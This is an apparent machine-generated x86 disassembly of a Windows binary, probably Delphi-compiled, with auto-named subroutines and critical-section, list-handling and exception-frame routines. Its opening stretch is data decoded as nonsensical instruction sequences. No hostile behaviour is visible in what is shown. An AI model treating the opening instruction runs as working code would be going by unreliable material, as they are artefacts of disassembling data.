xchg [ ecx ] eax
adc [ eax ] al
inc ecx
add [ eax * 8 - 0x3abbffbf ] ch
inc ecx
add [ ebx + ecx * 8 ] dh
inc ecx
add [ edx + ebp ] ch
inc eax
add [ ebx + ecx * 8 + 0x41 ] ch
add [ eax - 0x3a ] ch
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
push 0x600041c6
int3
je r-xdata
inc ecx
add [ eax - 0x3a ] ch
inc ecx
add [ eax - 0x34 ] ah
inc ecx
add [ 0x6d654d54 ] cl
insd
dec ebp
insd
outsd
jb r-xdata
push ebx
push ebx
jns r-xdata
push ebx
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
jne r-xdata
popad
insd
mov eax eax
js r-xdata
loopne r-xdata
je r-xdata
outsd
jb r-xdata
insd
popad
insd
cld
xchg [ ecx ] eax
add [ eax ] al
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x24 ]
je r-xdata
arpl [ ebp + 0x53 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x88
inc ecx
add [ eax + eax ] dl
add [ eax ] al
xor al 0x87
inc ecx
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff9041c82a

inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 + 0x180041 ] dl
add [ eax ] al
xor al 0x87
inc ecx
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x7041c8a6
into
inc ecx
add al ah
les eax [ ecx ]
sub al 0xc5
inc ecx
add [ ebp + eax * 8 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
mov [ ecx ] al
sbb [ eax ] al
add [ ebx + ecx * 8 ] dh
inc ecx
add [ eax + 0x6c0041ce ] ch

inc ecx
add [ eax * 8 - 0x3abbffbf ] ch
inc ecx
sub_4189bc
xchg esi eax
mov [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx + 0x180041 ] cl
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
push 0xa0004212
adc al [ edx ]
or [ ebx ] dl
inc edx
add [ eax + 0x13 ] dh
inc edx
add ah dh
adc eax [ edx ]
pop eax
adc al 0x42
add [ eax + 0x16 ] bl
inc edx
add [ esi + edx + 0x42 ] ah
add [ eax + 0x16 ] dh
inc edx
add [ esi + edx + 0x42 ] bh
add [ eax + 0x4004216 ] cl
pop ss
inc edx
add [ esi ] cl
push esp
push ebx
je r-xdata
mov [ edx + 0x41 ] cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0x80041 ] cs
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x4441caba
0x540c0041 0x6c43
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
mov al [ ecx ]
sub [ eax ] al
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x841cb16
iretd
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add al ch
mov al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
lea eax [ eax ]
call sub_41cc2b
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7c00418b ] al
add [ eax ] al
add [ edx + ecx * 4 + 0x347c0041 ] bl
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffc841cb7a
aad 0x41
add [ eax ] dh
iretd
sub_418b04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
lea eax [ eax ]
call sub_41cc2b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov al [ ecx ]
sub [ eax ] al
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x841cb16
iretd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7c00418b ] al
add [ eax ] al
add [ edx + ecx * 4 + 0x347c0041 ] bl
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffc841cb7a
aad 0x41
add [ eax ] dh
iretd
sub_418b4e
inc ecx
add [ eax ] ch
salc
inc ecx
add [ esi + edx * 8 + 0x41 ] bl
add [ eax - 0x27 ] dh
inc ecx
add [ edi + edx * 8 + 0x41 ] cl
add [ eax - 0x8 ] bh
inc ecx
add [ edi + edx * 8 + 0x41 ] ch
add [ eax - 0x7 ] cl
inc ecx
add [ eax ] dh
stc
inc ecx
add [ esi + 0xe0041 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
sub_418c5e
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
inc esp
and al 0x4
aam 0xe9
aas
add [ eax ] 0x0
int3
jns r-xdata
lea ecx [ ecx + eax * 2 + 0x418cb700 ]
add ch al
mov [ ecx ] es
iretd
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e845e5
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
mov [ 0xffffffff83000082 ] eax
inc esp
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
add bh bh
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_418d03
int 0x6b
dec edi
add [ ecx + 0x51 ] 0xed
fimul [ ecx + eax * 2 + 0x2800 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
0x2c00418c 0x0
sub_41900c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40624c
pop edi
pop esi
pop ebx
retn
sub_419034
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406230
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41905c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406254
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_419154
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_41a468
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403460
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403460
test al al
je r-xdata
sub_4191b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_419154
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_419154
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403460
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41a30c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4192a0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
mov eax [ esi + 0x4 ]
call sub_403234
mov eax [ esi + 0x8 ]
call sub_403234
mov eax [ esi + 0xc ]
call sub_403234
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4192e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_41a468
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403198
test al al
jne r-xdata
sub_419340
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_41a468
mov edx eax
mov eax ebp
call sub_403460
test al al
jne r-xdata
sub_419384
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41941f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4192e0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a30c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419426
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_419444
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_4053f0
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_419464
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a468
mov edx edi
call sub_419444
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a468
mov edx edi
call sub_419444
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a358
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_419444
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a358
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_419508
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_41a468
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_419340
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_419554
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419224
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a30c
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4195c8
push ebx
push esi
push edi
push ebp
call sub_4035c0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
mov eax [ esi + 0x4 ]
mov edx edi
call sub_41a468
call sub_403234
inc edi
dec ebp
jne r-xdata
sub_419624
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_41a468
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4191b4
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_419668
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4192e0
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_41a468
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4196ac
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41972f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403184
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419736
lea eax [ ebp - 0x10c ]
call sub_404008
retn
sub_41973c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419624
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_419148
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4196ac
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_41a468
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a468
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403460
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_419624
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a358
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41a30c
sub_419828
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a468
mov edx ebp
call sub_41942c
test al al
jne r-xdata
sub_41986c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_419224
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41a30c
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a468
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41a4c4
test eax eax
jge r-xdata
sub_4198c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a468
mov esi eax
mov edx ebp
mov eax esi
call sub_419464
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403234
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a358
sub_419918
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419a17
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a1e
mov eax [ rw-data ]
call sub_4198bc
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a30c
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a468
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_419340
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a30c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a468
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_419a1e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_419a44
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_419a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_419804
xor edx edx
push ebp
push sub_419aeb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4198bc
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a6c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a468
mov edx [ ebp - 0x4 ]
call sub_4192e0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419b08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419b68
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b6f
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_419b74
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419bba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_419668
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bc1
mov eax [ rw-data ]
call sub_4198bc
retn
sub_419bc8
push ebx
push esi
mov esi eax
mov eax esi
call sub_419b74
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_419b08
sub_419be8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419c4d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_419828
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_419810
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c54
mov eax [ rw-data ]
call sub_4198bc
retn
mov eax ebx
call sub_4031c0
mov ebx eax
sub_419c58
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419c9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4198c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ca1
mov eax [ rw-data ]
call sub_4198bc
retn
sub_419ca4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_419804
xor eax eax
push ebp
push sub_419ce6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41986c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ced
mov eax [ rw-data ]
